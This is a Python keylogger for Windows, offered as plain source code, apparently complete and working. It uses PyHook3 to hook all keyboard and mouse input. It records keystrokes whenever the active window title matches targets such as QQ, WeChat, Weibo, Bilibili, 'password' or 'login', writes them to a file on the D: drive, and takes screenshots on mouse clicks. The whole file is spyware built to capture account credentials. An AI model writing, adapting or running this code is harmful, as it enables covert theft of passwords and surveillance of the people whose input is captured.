import pythoncom 
import PyHook3
import os
import time
from PIL import ImageGrab

lists=['百度','QQ','哔哩哔哩','微博','微信','密码','password','账号','account','login','kali linux','bilibili']
MSG=""
save_to=1
title_word=""
global_title=""

def simple_count(file_name):
    lines = 0
    for _ in open(file_name):
        lines += 1
    return lines

def write_msg_to_txt(msg):
    if os.path.exists('D:\\QQdata\\data\\Monitor.txt')==False:
        os.system('mkdir d:\\QQdata\\data\\xx11 >nul')
        os.system('type nul > d:\\QQdata\\data\\Monitor.txt')
    fname='D:/QQdata/data/Monitor.txt'

    cl=simple_count(fname) 
    if cl >=10:
        f=open(fname,'w')
        f.write('\x00')
        f.close()

    f=open(fname,'a')
    f.write(msg+'\x0A')
    f.close()

def get_local_time(press):
    if press=='keyboard':
        return time.strftime('%Y-%m-%d_%H:%M: ', time.localtime(time.time()))
    else:
        return time.strftime('%Y-%m-%d_%Hh%Mm%Ss', time.localtime(time.time()))
def get_local_image():
    pic=ImageGrab.grab()
    pic_name='D:/QQdata/data/xx11/mouse_%s.jpg' %get_local_time("")
    pic.save('%s' %pic_name)
    return pic_name 
def onMouseEvent(event):
    global lists
    global MSG
    global global_title
    mouse_status=event.MessageName

    pic_msg=""
    if mouse_status=="mouse left down" or mouse_status=="mouse right down":
        if global_title in lists:
            if MSG!="":
                write_msg_to_txt(MSG)
                pic_msg=get_local_image()
                write_msg_to_txt(pic_msg)
#            print( "MessageName:",event.MessageName)
            global_title=""
    # 也就是说你的鼠标看起来会僵在那儿，似乎失去响应了
    return True

def onKeyboardEvent(event):
    #--------------判断用户目前在操作的界面开头是否包含关键词算法---------------
    global lists
    global MSG
    global title_word
    global global_title

    keyid=event.Ascii
    keychar=chr(event.Ascii) 
    keyword=event.Key
    title=event.WindowName

    words=''
    status=1
    title_status=1
    break_status=1

    if len(title) >0:
        for n in range(len(lists)):
            if len(title) >=len(lists[n]):
                for tw in title:
                    words+=tw
                    if words ==lists[n]:
                        global_title=words
                        title_status=0
                        break_status=0
                        break
            if break_status==0:
                break
            words=''

    if title_status==0:
        if (title_word!=title and keyword!="Lcontrol" and keyword!="Rcontrol"
            and keyword!="Lmenu" and keyword!="Rmenu" and keyword!="Capital"
            and keyword!="Lshift" and keyword!="Rshift" 
            ):
            title_word=title
            MSG=get_local_time('keyboard')+title+"窗口: "
        if 127 > keyid >32:
            MSG+=keychar
        else:
            if keyword=="Return":
                MSG+="<回车>"
                status=0
            elif keyword=="Tab":
                MSG+="<水平制表>"
            elif keyword=="Back":
                MSG+="<退格>"
            elif keyword=="Delete":
                MSG+="<删除>"
            elif keyword=="Space":
                MSG+="<空格>"
    if status == 0:
        if MSG!="":
            write_msg_to_txt(MSG)
        title_word=""
        global_title=""
        kwords=""
    #-----------------------------------------------------------------------
    # 同鼠标事件监听函数的返回值
    return True

def main():
    # 创建一个“钩子”管理对象
    hm = PyHook3.HookManager()
    # 监听所有鼠标事件钩子
    hm.MouseAll = onMouseEvent
    hm.HookMouse()
    # 监听所有键盘事件钩子
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
    # 进入循环，如不手动关闭，程序将一直处于监听状态
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()

